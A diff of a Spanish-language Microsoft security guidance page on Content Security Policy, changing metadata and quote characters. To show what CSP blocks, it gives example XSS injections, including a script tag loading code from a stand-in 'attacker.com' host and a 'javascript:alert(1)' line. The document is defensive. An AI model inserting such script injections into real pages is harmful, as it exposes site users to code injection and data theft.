@@ -15,12 +15,12 @@ ms.devlang: na
 ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
-ms.openlocfilehash: 986bed758229d639bb40d0803f7be4a89a0f6e49
-ms.sourcegitcommit: 13a289ba57cfae728831e6d38b7f82dae165e59d
+ms.openlocfilehash: fedf8118f5581056e40594419c17f074c339a61b
+ms.sourcegitcommit: 0b1a4101d575e28af0f0d161852b57d82c9b2a7e
 ms.translationtype: HT
 ms.contentlocale: es-ES
-ms.lasthandoff: 08/09/2019
-ms.locfileid: "68934805"
+ms.lasthandoff: 10/30/2019
+ms.locfileid: "73161543"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>Marco de seguridad: Administración de configuración | Mitigaciones 
 | Producto o servicio | Artículo |
@@ -44,7 +44,7 @@ ms.locfileid: "68934805"
 | **Tecnologías aplicables** | Genérico |
 | **Atributos**              | N/D  |
 | **Referencias**              | [An Introduction to Content Security Policy](https://www.html5rocks.com/en/tutorials/security/content-security-policy/) (Introducción a la directiva de seguridad del contenido), [Content Security Policy Reference](https://content-security-policy.com/) (Referencia a la directiva de seguridad del contenido), [Security features](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/) (Características de seguridad), [Introduction to content security policy](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy) (Introducción a la directiva de seguridad del contenido), [Can I use CSP?](https://caniuse.com/#feat=contentsecuritypolicy) (¿Puedo usar la directiva de seguridad de contenido [CSP]?) |
-| **Pasos** | <p>La directiva de seguridad de contenido (CSP) es un mecanismo de seguridad de defensa en profundidad, una norma de W3C, que permite controlar el contenido insertado en el sitio a los propietarios de aplicaciones web. La CSP se agrega como encabezado de respuesta HTTP al servidor web y se aplica en los exploradores del lado del cliente. Es una directiva basada en una lista blanca: un sitio web puede declarar un conjunto de dominios de confianza desde los que se puede cargar contenido activo, como JavaScript.</p><p>La CSP ofrece las siguientes ventajas de seguridad:</p><ul><li>**Protección frente a XSS:** si una página es vulnerable a XSS, los atacantes pueden aprovecharlo de dos maneras:<ul><li>Insertando `<script>malicious code</script>`. Gracias a la restricción básica 1 de la CSP, esta vulnerabilidad de seguridad no funcionará</li><li>Insertando `<script src=”http://attacker.com/maliciousCode.js”/>`. Esta vulnerabilidad de seguridad no funcionará, ya que el dominio que controla el atacante no estará en la lista de dominios aprobados de la CSP</li></ul></li><li>**Control de la exfiltración de datos:** si cualquier contenido malintencionado de una página web intenta conectarse a un sitio web externo y robar datos, la CSP anulará la conexión. ya que el dominio de destino no estará en la lista aprobada de la CSP</li><li>**Defensa contra el secuestro de clic:** el secuestro de clic es una técnica de ataque con la que un adversario puede enmarcar un sitio web auténtico y forzar a los usuarios a hacer clic en elementos de la interfaz de usuario. La defensa actual contra el secuestro de clic se consigue mediante la configuración de un encabezado de respuesta X-Frame-Option. No todos los exploradores respetan este encabezado y la implementación de la CSP será un método estándar de defensa contra el secuestro de clic</li><li>**Informes de ataques en tiempo real:** si se produce un ataque de inserción de código en un sitio web con la CSP habilitada, los exploradores desencadenarán automáticamente una notificación a un punto de conexión configurado en el servidor web. De esta manera, la CSP actúa como sistema de advertencia en tiempo real.</li></ul> |
+| **Pasos** | <p>La directiva de seguridad de contenido (CSP) es un mecanismo de seguridad de defensa en profundidad, una norma de W3C, que permite controlar el contenido insertado en el sitio a los propietarios de aplicaciones web. La CSP se agrega como encabezado de respuesta HTTP al servidor web y se aplica en los exploradores del lado del cliente. Es una directiva basada en una lista blanca: un sitio web puede declarar un conjunto de dominios de confianza desde los que se puede cargar contenido activo, como JavaScript.</p><p>La CSP ofrece las siguientes ventajas de seguridad:</p><ul><li>**Protección frente a XSS:** si una página es vulnerable a XSS, los atacantes pueden aprovecharlo de dos maneras:<ul><li>Insertando `<script>malicious code</script>`. Gracias a la restricción básica 1 de la CSP, esta vulnerabilidad de seguridad no funcionará</li><li>Insertando `<script src="http://attacker.com/maliciousCode.js"/>`. Esta vulnerabilidad de seguridad no funcionará, ya que el dominio que controla el atacante no estará en la lista de dominios aprobados de la CSP</li></ul></li><li>**Control de la exfiltración de datos:** si cualquier contenido malintencionado de una página web intenta conectarse a un sitio web externo y robar datos, la CSP anulará la conexión. ya que el dominio de destino no estará en la lista aprobada de la CSP</li><li>**Defensa contra el secuestro de clic:** el secuestro de clic es una técnica de ataque con la que un adversario puede enmarcar un sitio web auténtico y forzar a los usuarios a hacer clic en elementos de la interfaz de usuario. La defensa actual contra el secuestro de clic se consigue mediante la configuración de un encabezado de respuesta X-Frame-Option. No todos los exploradores respetan este encabezado y la implementación de la CSP será un método estándar de defensa contra el secuestro de clic</li><li>**Informes de ataques en tiempo real:** si se produce un ataque de inserción de código en un sitio web con la CSP habilitada, los exploradores desencadenarán automáticamente una notificación a un punto de conexión configurado en el servidor web. De esta manera, la CSP actúa como sistema de advertencia en tiempo real.</li></ul> |
 
 ### <a name="example"></a>Ejemplo
 Ejemplo de directiva: 
@@ -57,7 +57,7 @@ Esta directiva permite a los scripts cargar solo desde el servidor de la aplicac
 Los scripts en línea no se ejecutarán. Ejemplos de scripts en línea 
 ```javascript
 <script> some Javascript code </script>
-Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
+Event handling attributes of HTML tags (e.g., <button onclick="function(){}">
 javascript:alert(1);
 ```
 
